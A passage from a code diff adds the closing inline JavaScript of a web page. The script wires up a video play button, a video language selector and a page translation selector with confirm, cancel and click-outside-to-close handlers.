+        cancelLanguageBtn.addEventListener('click', function() {
+            document.getElementById('language-selector').style.display = 'none';
+            document.body.style.overflow = '';
+        });
+        
+        // Language selection for video
+        document.querySelectorAll('#language-selector .language-option').forEach(option => {
+            option.addEventListener('click', function() {
+                document.querySelectorAll('#language-selector .language-option').forEach(opt => {
+                    opt.classList.remove('selected');
+                });
+                this.classList.add('selected');
+            });
+        });
+        
+        // When video ends, show the play button again
+        video.addEventListener('ended', function() {
+            playButton.style.display = 'flex';
+        });
+        
+        // If video is paused by user, show controls
+        video.addEventListener('pause', function() {
+            video.controls = true;
+        });
+        
+        // Show play button when video is not playing
+        video.addEventListener('play', function() {
+            playButton.style.display = 'none';
+        });
+
+        // Translation selector functionality
+        const translateBtn = document.getElementById('translate-btn');
+        const translationSelector = document.getElementById('translation-selector');
+        const confirmTranslationBtn = document.getElementById('confirm-translation-btn');
+        const cancelTranslationBtn = document.getElementById('cancel-translation-btn');
+        
+        // When translate button is clicked
+        translateBtn.addEventListener('click', function() {
+            translationSelector.style.display = 'flex';
+            document.body.style.overflow = 'hidden';
+            
+            document.querySelectorAll('#translation-selector .language-option').forEach(option => {
+                option.classList.remove('selected');
+                if (option.getAttribute('data-lang') === currentLanguage) {
+                    option.classList.add('selected');
+                }
+            });
+        });
+        
+        // When confirm button is clicked in translation selector
+        confirmTranslationBtn.addEventListener('click', function() {
+            const selectedOption = document.querySelector('#translation-selector .language-option.selected');
+            const lang = selectedOption.getAttribute('data-lang');
+            
+            translationSelector.style.display = 'none';
+            document.body.style.overflow = '';
+            
+            if (lang !== currentLanguage) {
+                translatePage(lang);
+            }
+        });
+        
+        // When cancel button is clicked in translation selector
+        cancelTranslationBtn.addEventListener('click', function() {
+            translationSelector.style.display = 'none';
+            document.body.style.overflow = '';
+        });
+        
+        // Language selection for translation
+        document.querySelectorAll('#translation-selector .language-option').forEach(option => {
+            option.addEventListener('click', function() {
+                document.querySelectorAll('#translation-selector .language-option').forEach(opt => {
+                    opt.classList.remove('selected');
+                });
+                this.classList.add('selected');
+            });
+        });
+        
+        // Close selectors when clicking outside
+        [languageSelector, translationSelector].forEach(selector => {
+            selector.addEventListener('click', function(e) {
+                if (e.target === selector) {
+                    selector.style.display = 'none';
+                    document.body.style.overflow = '';
+                }
+            });
+        });
+    </script>
+
+</body></html>
